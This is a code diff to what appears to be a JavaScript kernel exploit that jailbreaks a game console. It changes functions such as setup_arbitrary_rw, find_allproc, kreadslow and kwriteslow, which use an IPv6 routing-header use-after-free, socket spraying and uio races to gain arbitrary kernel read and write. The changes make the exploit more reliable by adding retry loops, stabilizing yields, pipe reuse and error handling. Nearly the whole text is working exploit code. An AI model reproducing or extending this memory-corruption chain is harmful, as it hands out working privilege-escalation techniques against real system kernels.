@@ -3,8 +3,12 @@ import { libc_addr } from 'download0/userland'
 import { get_fwversion, hex, malloc, read16, read32, read64, send_notification, write16, write32, write64, write8, get_kernel_offset, kernel, jailbreak_shared, read8 } from 'download0/kernel'
 import { show_success, run_binloader } from 'download0/loader'
 
-// include('userland.js')
-include('kernel.js')
+if (typeof libc_addr === 'undefined') {
+  include('userland.js');
+}
+include('kernel.js');
+include('stats-tracker.js');
+include('binloader.js');
 
 if (!String.prototype.padStart) {
   String.prototype.padStart = function padStart (targetLength, padString) {
@@ -1085,9 +1089,10 @@ function setup_arbitrary_rw () {
   fhold(fget(victim_pipe[0]))
   fhold(fget(victim_pipe[1]))
 
-  // Remove rthdr pointers from twins
+  // Remove rthdr pointers from triplets
   remove_rthr_from_socket(ipv6_socks[triplets[0]])
   remove_rthr_from_socket(ipv6_socks[triplets[1]])
+  remove_rthr_from_socket(ipv6_socks[triplets[2]])
 
   // Remove triple freed file from free list
   remove_uaf_file()
@@ -1103,19 +1108,19 @@ function setup_arbitrary_rw () {
 }
 
 function find_allproc () {
-  debug('find_allproc - Creating pipe...')
-  pipe(pipe_sock)
-  const pipe_0 = read32(pipe_sock)
-  const pipe_1 = read32(pipe_sock.add(0x04))
-  debug('find_allproc - pipe fds: ' + pipe_0 + ', ' + pipe_1)
+  // Use existing master_pipe instead of creating new one
+  const pipe_0 = master_pipe[0]
+  const pipe_1 = master_pipe[1]
+  debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1)
 
-  debug('find_allproc - Writing pid to buffer...')
+  debug('find_allproc - Getting pid...')
   const pid = Number(getpid())
   debug('find_allproc - pid: ' + pid)
+  debug('find_allproc - Writing pid to sockopt_val_buf...')
   write32(sockopt_val_buf, pid)
   debug('find_allproc - Calling ioctl FIOSETOWN...')
-  ioctl(new BigInt(pipe_0), FIOSETOWN, sockopt_val_buf)
-  debug('find_allproc - ioctl done')
+  const ioctl_ret = ioctl(new BigInt(pipe_0), FIOSETOWN, sockopt_val_buf)
+  debug('find_allproc - ioctl returned: ' + ioctl_ret)
 
   debug('find_allproc - Getting fp...')
   const fp = fget(pipe_0)
@@ -1145,8 +1150,7 @@ function find_allproc () {
   }
   debug('find_allproc - Found allproc after ' + walk_count + ' iterations')
 
-  close(new BigInt(pipe_1))
-  close(new BigInt(pipe_0))
+  // Don't close - using master_pipe which we need
 
   return p
 }
@@ -1158,6 +1162,10 @@ function jailbreak () {
   }
   if (FW_VERSION === null) {
     throw new Error('FW_VERSION is null')
+  }
+  // Stabilize
+  for (let i = 0; i < 10; i++) {
+    sched_yield()
   }
   debug('jailbreak - Calling find_allproc...')
   kernel.addr.allproc = find_allproc() // Set global allproc
@@ -1585,6 +1593,9 @@ function kreadslow (addr: BigInt, size: number) {
       zeroMemoryCount = 0
     }
     count++
+    if (count % 100 === 1) {
+      debug('kreadslow - uio loop iter ' + count)
+    }
     trigger_uio_writev() // COMMAND_UIO_READ in fl0w's
     sched_yield()
 
@@ -1592,7 +1603,6 @@ function kreadslow (addr: BigInt, size: number) {
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10)
 
     if (read32(uio_leak_add) === UIO_IOV_NUM) {
-      // debug("Break on reclaim with uio");
       break
     }
 
@@ -1693,12 +1703,30 @@ function kreadslow (addr: BigInt, size: number) {
 
   // Release iov spray.
   write(new BigInt(iov_sock_1), tmp, 1)
+  
+  if (leak_buffer.eq(0)) {
+    debug('kreadslow - No valid leak found')
+    wait_iov_recvmsg()
+    read(new BigInt(iov_sock_0), tmp, 1)
+    return BigInt_Error
+  }
 
   debug('kreadslow - Finding triplets[2]...')
 
   // Find triplet[2].
-  triplets[2] = find_triplet(triplets[0], triplets[1])
+  for (let retry = 0; retry < 3; retry++) {
+    triplets[2] = find_triplet(triplets[0], triplets[1])
+    if (triplets[2] !== -1) break
+    debug('kreadslow - triplets[2] retry ' + (retry + 1))
+    sched_yield()
+  }
   debug('kreadslow - triplets[2]=' + triplets[2])
+  if (triplets[2] === -1) {
+    debug('kreadslow - Failed to find triplets[2]')
+    wait_iov_recvmsg()
+    read(new BigInt(iov_sock_0), tmp, 1)
+    return BigInt_Error
+  }
 
   // Let's make sure that they are indeed triplets
   // const leak_0 = malloc(8);
@@ -1827,7 +1855,18 @@ function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
   write(new BigInt(iov_sock_1), tmp, 1)
 
   // Find triplet[2].
-  triplets[2] = find_triplet(triplets[0], triplets[1])
+  for (let retry = 0; retry < 3; retry++) {
+    triplets[2] = find_triplet(triplets[0], triplets[1])
+    if (triplets[2] !== -1) break
+    sched_yield()
+  }
+
+  if (triplets[2] === -1) {
+    debug('kwriteslow - Failed to find triplets[2]')
+    wait_iov_recvmsg()
+    read(new BigInt(iov_sock_0), tmp, 1)
+    return BigInt_Error
+  }
 
   // Workers should have finished earlier no need to wait
   wait_iov_recvmsg()
